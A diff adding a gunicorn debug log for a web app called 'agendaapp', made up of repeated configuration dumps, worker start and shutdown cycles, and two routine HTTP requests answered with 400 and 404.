@@ -1,0 +1,2165 @@
+[2026-03-03 18:38:26 +0000] [45041] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/agenda.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/windows/agendaapp
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1001
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/windows/agendaapp/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  enable_backlog_metric: False
+  proc_name: None
+  default_proc_name: project.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x72232879ec40>
+  on_reload: <function OnReload.on_reload at 0x72232879ee50>
+  when_ready: <function WhenReady.when_ready at 0x72232879f060>
+  pre_fork: <function Prefork.pre_fork at 0x72232879f1c0>
+  post_fork: <function Postfork.post_fork at 0x72232879f3d0>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x72232879f5e0>
+  worker_int: <function WorkerInt.worker_int at 0x72232879f740>
+  worker_abort: <function WorkerAbort.worker_abort at 0x72232879f950>
+  pre_exec: <function PreExec.pre_exec at 0x72232879fab0>
+  pre_request: <function PreRequest.pre_request at 0x72232879fcc0>
+  post_request: <function PostRequest.post_request at 0x72232879fe20>
+  child_exit: <function ChildExit.child_exit at 0x7223287b4040>
+  worker_exit: <function WorkerExit.worker_exit at 0x7223287b41a0>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x7223287b4300>
+  on_exit: <function OnExit.on_exit at 0x7223287b4460>
+  ssl_context: <function NewSSLContext.ssl_context at 0x7223287b45c0>
+  proxy_protocol: off
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  protocol: http
+  uwsgi_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  http_protocols: ['h1']
+  http2_max_concurrent_streams: 100
+  http2_initial_window_size: 65535
+  http2_max_frame_size: 16384
+  http2_max_header_list_size: 65536
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+  asgi_loop: auto
+  asgi_lifespan: auto
+  asgi_disconnect_grace_period: 3
+  root_path: 
+  dirty_apps: []
+  dirty_workers: 0
+  dirty_timeout: 300
+  dirty_threads: 1
+  dirty_graceful_timeout: 30
+  on_dirty_starting: <function OnDirtyStarting.on_dirty_starting at 0x7223287b4a90>
+  dirty_post_fork: <function DirtyPostFork.dirty_post_fork at 0x7223287b4bf0>
+  dirty_worker_init: <function DirtyWorkerInit.dirty_worker_init at 0x7223287b4d50>
+  dirty_worker_exit: <function DirtyWorkerExit.dirty_worker_exit at 0x7223287b4eb0>
+  control_socket: gunicorn.ctl
+  control_socket_mode: 384
+  control_socket_disable: False
+[2026-03-03 18:38:26 +0000] [45041] [INFO] Starting gunicorn 25.1.0
+[2026-03-03 18:38:26 +0000] [45041] [DEBUG] Arbiter booted
+[2026-03-03 18:38:26 +0000] [45041] [INFO] Listening at: unix:/run/agenda.socket (45041)
+[2026-03-03 18:38:26 +0000] [45041] [INFO] Using worker: sync
+[2026-03-03 18:38:26 +0000] [45041] [INFO] Control socket listening at /home/windows/agendaapp/gunicorn.ctl
+[2026-03-03 18:38:26 +0000] [45044] [INFO] Booting worker with pid: 45044
+[2026-03-03 18:38:26 +0000] [45045] [INFO] Booting worker with pid: 45045
+[2026-03-03 18:38:26 +0000] [45046] [INFO] Booting worker with pid: 45046
+[2026-03-03 18:38:26 +0000] [45047] [INFO] Booting worker with pid: 45047
+[2026-03-03 18:38:26 +0000] [45048] [INFO] Booting worker with pid: 45048
+[2026-03-03 18:38:26 +0000] [45049] [INFO] Booting worker with pid: 45049
+[2026-03-03 18:38:26 +0000] [45041] [DEBUG] 6 workers
+[2026-03-03 15:38:28 -0300] [45046] [DEBUG] GET /
+ - - [03/Mar/2026:15:38:28 -0300] "GET / HTTP/1.1" 400 143 "-" "curl/8.14.1"
+[2026-03-03 18:41:46 +0000] [45041] [INFO] Handling signal: term
+[2026-03-03 15:41:46 -0300] [45044] [INFO] Worker exiting (pid: 45044)
+[2026-03-03 15:41:46 -0300] [45045] [INFO] Worker exiting (pid: 45045)
+[2026-03-03 15:41:46 -0300] [45047] [INFO] Worker exiting (pid: 45047)
+[2026-03-03 15:41:46 -0300] [45049] [INFO] Worker exiting (pid: 45049)
+[2026-03-03 15:41:46 -0300] [45046] [INFO] Worker exiting (pid: 45046)
+[2026-03-03 15:41:46 -0300] [45048] [INFO] Worker exiting (pid: 45048)
+[2026-03-03 18:41:46 +0000] [45041] [INFO] Worker (pid:45044) was sent SIGTERM!
+[2026-03-03 18:41:46 +0000] [45041] [INFO] Worker (pid:45045) was sent SIGTERM!
+[2026-03-03 18:41:46 +0000] [45041] [INFO] Worker (pid:45046) was sent SIGTERM!
+[2026-03-03 18:41:46 +0000] [45041] [INFO] Worker (pid:45047) was sent SIGTERM!
+[2026-03-03 18:41:46 +0000] [45041] [INFO] Worker (pid:45048) was sent SIGTERM!
+[2026-03-03 18:41:46 +0000] [45041] [INFO] Worker (pid:45049) was sent SIGTERM!
+[2026-03-03 18:41:46 +0000] [45041] [INFO] Shutting down: Master
+[2026-03-03 18:41:46 +0000] [45099] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/agenda.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/windows/agendaapp
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1001
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/windows/agendaapp/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  enable_backlog_metric: False
+  proc_name: None
+  default_proc_name: project.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x7f2f17faac40>
+  on_reload: <function OnReload.on_reload at 0x7f2f17faae50>
+  when_ready: <function WhenReady.when_ready at 0x7f2f17fab060>
+  pre_fork: <function Prefork.pre_fork at 0x7f2f17fab1c0>
+  post_fork: <function Postfork.post_fork at 0x7f2f17fab3d0>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x7f2f17fab5e0>
+  worker_int: <function WorkerInt.worker_int at 0x7f2f17fab740>
+  worker_abort: <function WorkerAbort.worker_abort at 0x7f2f17fab950>
+  pre_exec: <function PreExec.pre_exec at 0x7f2f17fabab0>
+  pre_request: <function PreRequest.pre_request at 0x7f2f17fabcc0>
+  post_request: <function PostRequest.post_request at 0x7f2f17fabe20>
+  child_exit: <function ChildExit.child_exit at 0x7f2f17fc0040>
+  worker_exit: <function WorkerExit.worker_exit at 0x7f2f17fc01a0>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x7f2f17fc0300>
+  on_exit: <function OnExit.on_exit at 0x7f2f17fc0460>
+  ssl_context: <function NewSSLContext.ssl_context at 0x7f2f17fc05c0>
+  proxy_protocol: off
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  protocol: http
+  uwsgi_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  http_protocols: ['h1']
+  http2_max_concurrent_streams: 100
+  http2_initial_window_size: 65535
+  http2_max_frame_size: 16384
+  http2_max_header_list_size: 65536
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+  asgi_loop: auto
+  asgi_lifespan: auto
+  asgi_disconnect_grace_period: 3
+  root_path: 
+  dirty_apps: []
+  dirty_workers: 0
+  dirty_timeout: 300
+  dirty_threads: 1
+  dirty_graceful_timeout: 30
+  on_dirty_starting: <function OnDirtyStarting.on_dirty_starting at 0x7f2f17fc0a90>
+  dirty_post_fork: <function DirtyPostFork.dirty_post_fork at 0x7f2f17fc0bf0>
+  dirty_worker_init: <function DirtyWorkerInit.dirty_worker_init at 0x7f2f17fc0d50>
+  dirty_worker_exit: <function DirtyWorkerExit.dirty_worker_exit at 0x7f2f17fc0eb0>
+  control_socket: gunicorn.ctl
+  control_socket_mode: 384
+  control_socket_disable: False
+[2026-03-03 18:41:46 +0000] [45099] [INFO] Starting gunicorn 25.1.0
+[2026-03-03 18:41:46 +0000] [45099] [DEBUG] Arbiter booted
+[2026-03-03 18:41:46 +0000] [45099] [INFO] Listening at: unix:/run/agenda.socket (45099)
+[2026-03-03 18:41:46 +0000] [45099] [INFO] Using worker: sync
+[2026-03-03 18:41:46 +0000] [45102] [INFO] Booting worker with pid: 45102
+[2026-03-03 18:41:46 +0000] [45099] [INFO] Control socket listening at /home/windows/agendaapp/gunicorn.ctl
+[2026-03-03 18:41:46 +0000] [45103] [INFO] Booting worker with pid: 45103
+[2026-03-03 18:41:47 +0000] [45104] [INFO] Booting worker with pid: 45104
+[2026-03-03 18:41:47 +0000] [45105] [INFO] Booting worker with pid: 45105
+[2026-03-03 18:41:47 +0000] [45106] [INFO] Booting worker with pid: 45106
+[2026-03-03 18:41:47 +0000] [45107] [INFO] Booting worker with pid: 45107
+[2026-03-03 18:41:47 +0000] [45099] [DEBUG] 6 workers
+[2026-03-03 18:13:16 -0300] [45106] [DEBUG] POST /Autodiscover/Autodiscover.xml
+ - - [03/Mar/2026:18:13:16 -0300] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2026-03-03 18:23:19 -0300] [45106] [INFO] Worker exiting (pid: 45106)
+[2026-03-03 21:23:19 +0000] [45099] [INFO] Handling signal: term
+[2026-03-03 18:23:19 -0300] [45103] [INFO] Worker exiting (pid: 45103)
+[2026-03-03 18:23:19 -0300] [45105] [INFO] Worker exiting (pid: 45105)
+[2026-03-03 18:23:19 -0300] [45107] [INFO] Worker exiting (pid: 45107)
+[2026-03-03 18:23:19 -0300] [45104] [INFO] Worker exiting (pid: 45104)
+[2026-03-03 18:23:19 -0300] [45102] [INFO] Worker exiting (pid: 45102)
+[2026-03-03 21:23:19 +0000] [45099] [INFO] Worker (pid:45103) was sent SIGTERM!
+[2026-03-03 21:23:19 +0000] [45099] [INFO] Worker (pid:45105) was sent SIGTERM!
+[2026-03-03 21:23:19 +0000] [45099] [INFO] Worker (pid:45106) was sent SIGTERM!
+[2026-03-03 21:23:19 +0000] [45099] [INFO] Worker (pid:45107) was sent SIGTERM!
+[2026-03-03 21:23:20 +0000] [45099] [INFO] Shutting down: Master
+[2026-03-03 21:23:20 +0000] [47301] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/agenda.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/windows/agendaapp
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1001
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/windows/agendaapp/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  enable_backlog_metric: False
+  proc_name: None
+  default_proc_name: project.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x7433e379ec40>
+  on_reload: <function OnReload.on_reload at 0x7433e379ee50>
+  when_ready: <function WhenReady.when_ready at 0x7433e379f060>
+  pre_fork: <function Prefork.pre_fork at 0x7433e379f1c0>
+  post_fork: <function Postfork.post_fork at 0x7433e379f3d0>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x7433e379f5e0>
+  worker_int: <function WorkerInt.worker_int at 0x7433e379f740>
+  worker_abort: <function WorkerAbort.worker_abort at 0x7433e379f950>
+  pre_exec: <function PreExec.pre_exec at 0x7433e379fab0>
+  pre_request: <function PreRequest.pre_request at 0x7433e379fcc0>
+  post_request: <function PostRequest.post_request at 0x7433e379fe20>
+  child_exit: <function ChildExit.child_exit at 0x7433e37b4040>
+  worker_exit: <function WorkerExit.worker_exit at 0x7433e37b41a0>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x7433e37b4300>
+  on_exit: <function OnExit.on_exit at 0x7433e37b4460>
+  ssl_context: <function NewSSLContext.ssl_context at 0x7433e37b45c0>
+  proxy_protocol: off
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  protocol: http
+  uwsgi_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  http_protocols: ['h1']
+  http2_max_concurrent_streams: 100
+  http2_initial_window_size: 65535
+  http2_max_frame_size: 16384
+  http2_max_header_list_size: 65536
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+  asgi_loop: auto
+  asgi_lifespan: auto
+  asgi_disconnect_grace_period: 3
+  root_path: 
+  dirty_apps: []
+  dirty_workers: 0
+  dirty_timeout: 300
+  dirty_threads: 1
+  dirty_graceful_timeout: 30
+  on_dirty_starting: <function OnDirtyStarting.on_dirty_starting at 0x7433e37b4a90>
+  dirty_post_fork: <function DirtyPostFork.dirty_post_fork at 0x7433e37b4bf0>
+  dirty_worker_init: <function DirtyWorkerInit.dirty_worker_init at 0x7433e37b4d50>
+  dirty_worker_exit: <function DirtyWorkerExit.dirty_worker_exit at 0x7433e37b4eb0>
+  control_socket: gunicorn.ctl
+  control_socket_mode: 384
+  control_socket_disable: False
+[2026-03-03 21:23:20 +0000] [47301] [INFO] Starting gunicorn 25.1.0
+[2026-03-03 21:23:20 +0000] [47301] [DEBUG] Arbiter booted
+[2026-03-03 21:23:20 +0000] [47301] [INFO] Listening at: unix:/run/agenda.socket (47301)
+[2026-03-03 21:23:20 +0000] [47301] [INFO] Using worker: sync
+[2026-03-03 21:23:20 +0000] [47304] [INFO] Booting worker with pid: 47304
+[2026-03-03 21:23:20 +0000] [47301] [INFO] Control socket listening at /home/windows/agendaapp/gunicorn.ctl
+[2026-03-03 21:23:21 +0000] [47305] [INFO] Booting worker with pid: 47305
+[2026-03-03 21:23:21 +0000] [47306] [INFO] Booting worker with pid: 47306
+[2026-03-03 21:23:21 +0000] [47307] [INFO] Booting worker with pid: 47307
+[2026-03-03 21:23:21 +0000] [47308] [INFO] Booting worker with pid: 47308
+[2026-03-03 21:23:21 +0000] [47309] [INFO] Booting worker with pid: 47309
+[2026-03-03 21:23:21 +0000] [47301] [DEBUG] 6 workers
+[2026-03-03 21:27:22 +0000] [47301] [INFO] Handling signal: term
+[2026-03-03 18:27:22 -0300] [47304] [INFO] Worker exiting (pid: 47304)
+[2026-03-03 18:27:22 -0300] [47307] [INFO] Worker exiting (pid: 47307)
+[2026-03-03 18:27:22 -0300] [47305] [INFO] Worker exiting (pid: 47305)
+[2026-03-03 18:27:22 -0300] [47308] [INFO] Worker exiting (pid: 47308)
+[2026-03-03 18:27:22 -0300] [47309] [INFO] Worker exiting (pid: 47309)
+[2026-03-03 18:27:22 -0300] [47306] [INFO] Worker exiting (pid: 47306)
+[2026-03-03 21:27:22 +0000] [47301] [INFO] Worker (pid:47304) was sent SIGTERM!
+[2026-03-03 21:27:22 +0000] [47301] [INFO] Worker (pid:47305) was sent SIGTERM!
+[2026-03-03 21:27:22 +0000] [47301] [INFO] Worker (pid:47306) was sent SIGTERM!
+[2026-03-03 21:27:22 +0000] [47301] [INFO] Worker (pid:47307) was sent SIGTERM!
+[2026-03-03 21:27:22 +0000] [47301] [INFO] Worker (pid:47308) was sent SIGTERM!
+[2026-03-03 21:27:22 +0000] [47301] [INFO] Worker (pid:47309) was sent SIGTERM!
+[2026-03-03 21:27:23 +0000] [47301] [INFO] Shutting down: Master
+[2026-03-03 21:27:23 +0000] [47373] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/agenda.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/windows/agendaapp
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1001
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/windows/agendaapp/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  enable_backlog_metric: False
+  proc_name: None
+  default_proc_name: project.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x7f39177b6c40>
+  on_reload: <function OnReload.on_reload at 0x7f39177b6e50>
+  when_ready: <function WhenReady.when_ready at 0x7f39177b7060>
+  pre_fork: <function Prefork.pre_fork at 0x7f39177b71c0>
+  post_fork: <function Postfork.post_fork at 0x7f39177b73d0>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x7f39177b75e0>
+  worker_int: <function WorkerInt.worker_int at 0x7f39177b7740>
+  worker_abort: <function WorkerAbort.worker_abort at 0x7f39177b7950>
+  pre_exec: <function PreExec.pre_exec at 0x7f39177b7ab0>
+  pre_request: <function PreRequest.pre_request at 0x7f39177b7cc0>
+  post_request: <function PostRequest.post_request at 0x7f39177b7e20>
+  child_exit: <function ChildExit.child_exit at 0x7f39177cc040>
+  worker_exit: <function WorkerExit.worker_exit at 0x7f39177cc1a0>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x7f39177cc300>
+  on_exit: <function OnExit.on_exit at 0x7f39177cc460>
+  ssl_context: <function NewSSLContext.ssl_context at 0x7f39177cc5c0>
+  proxy_protocol: off
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  protocol: http
+  uwsgi_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  http_protocols: ['h1']
+  http2_max_concurrent_streams: 100
+  http2_initial_window_size: 65535
+  http2_max_frame_size: 16384
+  http2_max_header_list_size: 65536
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
+  strip_header_spaces: False
+  permit_unconventional_http_method: False
+  permit_unconventional_http_version: False
+  casefold_http_method: False
+  forwarder_headers: ['SCRIPT_NAME', 'PATH_INFO']
+  header_map: drop
+  asgi_loop: auto
+  asgi_lifespan: auto
+  asgi_disconnect_grace_period: 3
+  root_path: 
+  dirty_apps: []
+  dirty_workers: 0
+  dirty_timeout: 300
+  dirty_threads: 1
+  dirty_graceful_timeout: 30
+  on_dirty_starting: <function OnDirtyStarting.on_dirty_starting at 0x7f39177cca90>
+  dirty_post_fork: <function DirtyPostFork.dirty_post_fork at 0x7f39177ccbf0>
+  dirty_worker_init: <function DirtyWorkerInit.dirty_worker_init at 0x7f39177ccd50>
+  dirty_worker_exit: <function DirtyWorkerExit.dirty_worker_exit at 0x7f39177cceb0>
+  control_socket: gunicorn.ctl
+  control_socket_mode: 384
+  control_socket_disable: False
+[2026-03-03 21:27:23 +0000] [47373] [INFO] Starting gunicorn 25.1.0
+[2026-03-03 21:27:23 +0000] [47373] [DEBUG] Arbiter booted
+[2026-03-03 21:27:23 +0000] [47373] [INFO] Listening at: unix:/run/agenda.socket (47373)
+[2026-03-03 21:27:23 +0000] [47373] [INFO] Using worker: sync
+[2026-03-03 21:27:23 +0000] [47373] [INFO] Control socket listening at /home/windows/agendaapp/gunicorn.ctl
+[2026-03-03 21:27:23 +0000] [47376] [INFO] Booting worker with pid: 47376
+[2026-03-03 21:27:23 +0000] [47377] [INFO] Booting worker with pid: 47377
+[2026-03-03 21:27:23 +0000] [47378] [INFO] Booting worker with pid: 47378
+[2026-03-03 21:27:23 +0000] [47379] [INFO] Booting worker with pid: 47379
+[2026-03-03 21:27:23 +0000] [47380] [INFO] Booting worker with pid: 47380
+[2026-03-03 21:27:23 +0000] [47373] [DEBUG] 6 workers
+[2026-03-03 21:27:23 +0000] [47381] [INFO] Booting worker with pid: 47381
+[2026-03-03 21:36:24 +0000] [47373] [INFO] Handling signal: term
+[2026-03-03 18:36:24 -0300] [47376] [INFO] Worker exiting (pid: 47376)
+[2026-03-03 18:36:24 -0300] [47377] [INFO] Worker exiting (pid: 47377)
+[2026-03-03 18:36:24 -0300] [47380] [INFO] Worker exiting (pid: 47380)
+[2026-03-03 18:36:24 -0300] [47381] [INFO] Worker exiting (pid: 47381)
+[2026-03-03 18:36:24 -0300] [47379] [INFO] Worker exiting (pid: 47379)
+[2026-03-03 18:36:24 -0300] [47378] [INFO] Worker exiting (pid: 47378)
+[2026-03-03 21:36:24 +0000] [47373] [INFO] Worker (pid:47376) was sent SIGTERM!
+[2026-03-03 21:36:24 +0000] [47373] [INFO] Worker (pid:47377) was sent SIGTERM!
+[2026-03-03 21:36:24 +0000] [47373] [INFO] Worker (pid:47378) was sent SIGTERM!
+[2026-03-03 21:36:24 +0000] [47373] [INFO] Worker (pid:47379) was sent SIGTERM!
+[2026-03-03 21:36:24 +0000] [47373] [INFO] Worker (pid:47380) was sent SIGTERM!
+[2026-03-03 21:36:24 +0000] [47373] [INFO] Worker (pid:47381) was sent SIGTERM!
+[2026-03-03 21:36:25 +0000] [47373] [INFO] Shutting down: Master
+[2026-03-03 21:36:25 +0000] [47505] [DEBUG] Current configuration:
+  config: ./gunicorn.conf.py
+  wsgi_app: None
+  bind: ['unix:/run/agenda.socket']
+  backlog: 2048
+  workers: 6
+  worker_class: sync
+  threads: 1
+  worker_connections: 1000
+  max_requests: 0
+  max_requests_jitter: 0
+  timeout: 30
+  graceful_timeout: 30
+  keepalive: 2
+  limit_request_line: 4094
+  limit_request_fields: 100
+  limit_request_field_size: 8190
+  reload: False
+  reload_engine: auto
+  reload_extra_files: []
+  spew: False
+  check_config: False
+  print_config: False
+  preload_app: False
+  sendfile: None
+  reuse_port: False
+  chdir: /home/windows/agendaapp
+  daemon: False
+  raw_env: []
+  pidfile: None
+  worker_tmp_dir: None
+  user: 1001
+  group: 33
+  umask: 0
+  initgroups: False
+  tmp_upload_dir: None
+  secure_scheme_headers: {'X-FORWARDED-PROTOCOL': 'ssl', 'X-FORWARDED-PROTO': 'https', 'X-FORWARDED-SSL': 'on'}
+  forwarded_allow_ips: ['127.0.0.1', '::1']
+  accesslog: -
+  disable_redirect_access_to_syslog: False
+  access_log_format: %(h)s %(l)s %(u)s %(t)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"
+  errorlog: /home/windows/agendaapp/gunicorn-error-log
+  loglevel: debug
+  capture_output: True
+  logger_class: gunicorn.glogging.Logger
+  logconfig: None
+  logconfig_dict: {}
+  logconfig_json: None
+  syslog_addr: udp://localhost:514
+  syslog: False
+  syslog_prefix: None
+  syslog_facility: user
+  enable_stdio_inheritance: True
+  statsd_host: None
+  dogstatsd_tags: 
+  statsd_prefix: 
+  enable_backlog_metric: False
+  proc_name: None
+  default_proc_name: project.wsgi:application
+  pythonpath: None
+  paste: None
+  on_starting: <function OnStarting.on_starting at 0x773bb4b8ec40>
+  on_reload: <function OnReload.on_reload at 0x773bb4b8ee50>
+  when_ready: <function WhenReady.when_ready at 0x773bb4b8f060>
+  pre_fork: <function Prefork.pre_fork at 0x773bb4b8f1c0>
+  post_fork: <function Postfork.post_fork at 0x773bb4b8f3d0>
+  post_worker_init: <function PostWorkerInit.post_worker_init at 0x773bb4b8f5e0>
+  worker_int: <function WorkerInt.worker_int at 0x773bb4b8f740>
+  worker_abort: <function WorkerAbort.worker_abort at 0x773bb4b8f950>
+  pre_exec: <function PreExec.pre_exec at 0x773bb4b8fab0>
+  pre_request: <function PreRequest.pre_request at 0x773bb4b8fcc0>
+  post_request: <function PostRequest.post_request at 0x773bb4b8fe20>
+  child_exit: <function ChildExit.child_exit at 0x773bb4ba4040>
+  worker_exit: <function WorkerExit.worker_exit at 0x773bb4ba41a0>
+  nworkers_changed: <function NumWorkersChanged.nworkers_changed at 0x773bb4ba4300>
+  on_exit: <function OnExit.on_exit at 0x773bb4ba4460>
+  ssl_context: <function NewSSLContext.ssl_context at 0x773bb4ba45c0>
+  proxy_protocol: off
+  proxy_allow_ips: ['127.0.0.1', '::1']
+  protocol: http
+  uwsgi_allow_ips: ['127.0.0.1', '::1']
+  keyfile: None
+  certfile: None
+  ssl_version: 2
+  cert_reqs: 0
+  ca_certs: None
+  suppress_ragged_eofs: True
+  do_handshake_on_connect: False
+  ciphers: None
+  http_protocols: ['h1']
+  http2_max_concurrent_streams: 100
+  http2_initial_window_size: 65535
+  http2_max_frame_size: 16384
+  http2_max_header_list_size: 65536
+  raw_paste_global_conf: []
+  permit_obsolete_folding: False
